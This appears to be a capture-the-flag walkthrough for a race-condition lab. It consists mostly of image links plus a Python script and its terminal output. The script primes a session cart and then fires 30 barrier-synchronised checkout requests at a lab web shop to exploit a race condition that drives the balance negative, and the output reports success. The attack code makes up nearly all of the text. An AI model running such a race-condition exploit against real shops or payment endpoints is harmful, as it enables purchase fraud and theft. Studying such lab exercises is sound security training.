
<img width="838" height="334" alt="race-conditions-discount-code-race" src="https://github.com/user-attachments/assets/c0c6e078-057d-48c7-9f92-3b17a7063bff" />



<img width="955" height="415" alt="image" src="https://github.com/user-attachments/assets/6ccf8efb-cc75-4738-b75e-f7cfd88bd48e" />



https://github.com/user-attachments/assets/b08f57fa-a308-4a73-b9c3-d87c1db496f1


<img width="1584" height="388" alt="image" src="https://github.com/user-attachments/assets/8c2e5478-5f4a-4580-8628-615a004ad05a" />




<img width="1206" height="495" alt="image" src="https://github.com/user-attachments/assets/a346f24e-d7c8-43e4-8865-d55ae80fac40" />




<img width="404" height="207" alt="image" src="https://github.com/user-attachments/assets/7a788922-8deb-44aa-b010-665e353209d3" />




<img width="376" height="427" alt="image" src="https://github.com/user-attachments/assets/ce0a5e12-012e-4479-ace6-a72ea3a3a6c9" />




<img width="430" height="233" alt="image" src="https://github.com/user-attachments/assets/b819ace4-ffd8-460e-9713-3d6745f0444a" />




<img width="217" height="115" alt="image" src="https://github.com/user-attachments/assets/5ad1415b-a9a6-43e3-a0fa-c02ad23729ed" />




<img width="1578" height="150" alt="image" src="https://github.com/user-attachments/assets/0b0b9749-3947-461a-a7cd-59b767e70334" />




<img width="329" height="172" alt="image" src="https://github.com/user-attachments/assets/c178761c-1a58-4979-9d53-89fd96e98f22" />




<img width="207" height="43" alt="image" src="https://github.com/user-attachments/assets/002d7c36-c265-47d6-842c-8d72a8532213" />




https://github.com/user-attachments/assets/09bd865d-607b-45ef-a3c1-ad40844ac44e




<img width="951" height="456" alt="image" src="https://github.com/user-attachments/assets/7640e6d9-0f28-4388-8cfd-99bd88b2fdf7" />




``` python

import requests
import threading

cookie = "eyJjYXJ0Ijp7fSwidXNlciI6ImF0dGFja2VyIn0.anT97Q.NVUNzBToq8x57XGlNypMmLKhMps"

url = "http://10.113.187.5"
data = {"product_id":"plush-001","qty":1}

NUM_THREADS = 30

barrier = threading.Barrier(NUM_THREADS)

def checkout():
     try:
         s = requests.Session()
         s.cookies.set("session", updated_cookie)
         req = requests.Request("POST", url + "/process_checkout")
         prepared = s.prepare_request(req)
         s.get(url + "/shop")
         barrier.wait()
         r = s.send(prepared)
     except Exception as e:
                           print(f"Error: {e}")


s = requests.Session()
s.cookies.set("session", cookie)
r = s.post(url + "/add_to_cart", data=data)

updated_cookie = None
for c in s.cookies:
    if c.name == "session":
        updated_cookie = c.value

print(f"[*] Add to cart: {r.status_code}")
print(f"[*] Cookie actualizada: {updated_cookie}")

threads = [threading.Thread(target=checkout) for x in range(NUM_THREADS)]

for t in threads:

      t.start()

for t in threads:

      t.join()


r = requests.get(url + "/shop", cookies={"session": updated_cookie})

if "-25" not in r.text:
        print("Something was wrong")
else:
     print("Race condition was exploited succesfully")

```

``` bash

❯ python3 race-condition.py
[*] Add to cart: 200
[*] Cookie actualizada: eyJjYXJ0Ijp7InBsdXNoLTAwMSI6MX0sInVzZXIiOiJhdHRhY2tlciJ9.anUULg.81Hq6pKBx6j2-ozE5wc9TU2WUiM
Race condition was exploited succesfully
╭─ ~/hacking/ctf/thm/walktroughs/race-conditions-toy-to-the-world                                                  ✔ ─╮
╰─                                                                                                                   ─╯

```



<img width="957" height="545" alt="image" src="https://github.com/user-attachments/assets/4764ae99-b51c-42f1-a05a-c8ab1324213a" />




















